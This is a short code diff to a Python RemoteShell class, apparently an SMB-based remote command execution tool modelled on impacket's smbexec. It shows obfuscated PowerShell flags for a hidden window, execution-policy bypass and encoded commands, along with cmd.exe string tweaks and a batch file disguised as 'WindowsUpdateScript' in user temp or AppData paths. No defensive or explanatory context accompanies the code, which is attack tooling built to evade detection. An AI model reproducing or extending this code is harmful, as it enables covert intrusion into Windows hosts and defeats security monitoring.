@@ -177,10 +177,10 @@ class RemoteShell(cmd.Cmd):
         cmd.Cmd.__init__(self)
         self.__share = share
         self.__mode = mode
-        self.__output = '\\\\%COMPUTERNAME%\\' + self.__share + '\\' + OUTPUT_FILENAME
+        self.__output = '\\\\%COMPUTERNAME%\\' + self.__share + '\\' + 'Windows\\Temp\\' + OUTPUT_FILENAME
         self.__outputBuffer = b''
         self.__command = ''
-        self.__shell = 'c^md.exe ;"/"Q "@" ,/^c '
+        self.__shell = 'cmd.exe ;"/"Q "@" ,/c '
         self.__shell_type = shell_type
         self.__pwsh = 'POWeRShELl.exe ―N"o"pRo -N"o"Lo -St -"n"onI"NTER"a"C" -w Hi"dd"en —E"XEc"ut B"y"p"a"s"s" —En"co"deD"COM" '
         self.__serviceName = serviceName
@@ -281,7 +281,7 @@ class RemoteShell(cmd.Cmd):
             data = '$ProgressPreference="SilentlyContinue";' + data
             data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
 
-        batchFile = 'C:\\%USER%\\AppData\\Local\\Temp\\' + 'WindowsUpdateScript' + ''.join([random.choice(string.ascii_letters) for _ in range(2)]) + '.cmd'
+        batchFile = '%APPDATA%\\' + 'WindowsUpdateScript' + ''.join([random.choice(string.ascii_letters) for _ in range(2)]) + '.cmd'
                 
         command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + batchFile + ' & ' + \
                   self.__shell + batchFile
